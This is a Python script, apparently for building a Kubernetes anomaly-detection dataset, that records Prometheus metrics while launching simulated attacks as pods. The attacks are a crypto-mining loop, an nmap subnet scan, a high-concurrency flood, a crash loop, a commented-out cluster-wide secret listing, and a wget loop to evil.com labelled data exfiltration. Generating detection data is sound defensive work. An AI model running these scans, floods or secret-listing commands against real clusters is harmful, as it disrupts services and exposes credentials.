import subprocess
import time
import requests
import csv
from datetime import datetime
import os
import threading

PROMETHEUS_URL = "http://127.0.0.1:30925"
TARGET_1 = "http://127.0.0.1:41628 "
TARGET_2 = "  http://127.0.0.1:41596"

METRICS = {
    "restarts": 'sum(kube_pod_container_status_restarts_total)',
    "cpu": 'sum(rate(container_cpu_usage_seconds_total[1m]))',
    "memory": 'sum(rate(container_memory_usage_bytes[1m]))',
    "net_tx": 'sum(rate(container_network_transmit_bytes_total[1m]))',
    "net_rx": 'sum(rate(container_network_receive_bytes_total[1m]))'
}
CSV_FILE = "metrics_dataset.csv"

def run_cmd(cmd):
    print(f"[CMD] {cmd}")
    subprocess.Popen(cmd, shell=True)

def delete_pod(name):
    subprocess.run(f"kubectl delete pod {name} --ignore-not-found", shell=True)

def collect_metrics_for_duration(duration_min, label):
    for _ in range(duration_min * 6):  # 10s interval
        collect_metrics(label)
        time.sleep(10)

def collect_metrics(label):
    row = [datetime.utcnow().isoformat()]
    for key, query in METRICS.items():
        try:
            resp = requests.get(f"{PROMETHEUS_URL}/api/v1/query", params={"query": query})
            value = resp.json()['data']['result'][0]['value'][1]
        except Exception:
            value = "NaN"
        row.append(value)
    row.append(label)
    with open(CSV_FILE, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(row)

def init_csv():
    if not os.path.exists(CSV_FILE):
        with open(CSV_FILE, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["timestamp", "restarts", "cpu", "memory", "net_tx", "net_rx", "label"])

def main():
    init_csv()

    # Lancer le trafic normal en continu pendant toute la session (2 cibles)
    run_cmd(f"hey -z 45m -q 5 -c 2 {TARGET_1} & hey -z 55m -q 5 -c 2 {TARGET_2}")

    # Phase 1 : Normal
    collect_metrics_for_duration(5, "normal")

    # Attaque 1 : Mining (5 min)
    run_cmd("kubectl run miner --image=alpine --restart=Never -- /bin/sh -c \"while true; do sha256sum /dev/urandom; done\"")
    collect_metrics_for_duration(5, "anomaly")
    delete_pod("miner")

    # Phase normale (5 min)
    collect_metrics_for_duration(5, "normal")

    # Attaque 2 : Scan réseau
    run_cmd("kubectl run scanner --image=instrumentisto/nmap --restart=Never -- nmap -sS 192.168.49.0/24")
    collect_metrics_for_duration(5, "anomaly")
    delete_pod("scanner")

    # Phase normale (5 min)
    collect_metrics_for_duration(5, "normal")

    # Attaque 3 : DDoS (5 min)
    run_cmd(f"hey -z 5m -c 10000 {TARGET_1}")
    collect_metrics_for_duration(5, "anomaly")
    delete_pod("ddos")

    # Phase normale (5 min)
    collect_metrics_for_duration(5, "normal")

    # Attaque 4 : Reconnaissance de secrets (2 min)
    #run_cmd("kubectl run recon --image=bitnami/kubectl --restart=Never -- /bin/sh -c \"kubectl get secrets --all-namespaces\"")
    #collect_metrics_for_duration(2, "anomaly")
    #delete_pod("recon")

    # Attaque 5 : Crash loop (5 min)
    run_cmd("kubectl run crashy --image=busybox --restart=Always -- /bin/sh -c \"exit 1\"")
    collect_metrics_for_duration(5, "anomaly")
    delete_pod("crashy")

    # Phase normale (5 min)
    collect_metrics_for_duration(5, "normal")

    # Attaque 6 : Data exfiltration (5 min)
    run_cmd("kubectl run exfil --image=alpine --restart=Never -- /bin/sh -c \"while true; do wget http://evil.com/secret -O /dev/null; done\"")
    collect_metrics_for_duration(5, "anomaly")
    delete_pod("exfil")

    # Nettoyage du pod de trafic normal
    delete_pod("normal-traffic")

    # Phase normale (5 min)
    collect_metrics_for_duration(5, "normal")

    print(" Session terminée. Données enregistrées dans metrics_dataset.csv")

if __name__ == "__main__":
    main()
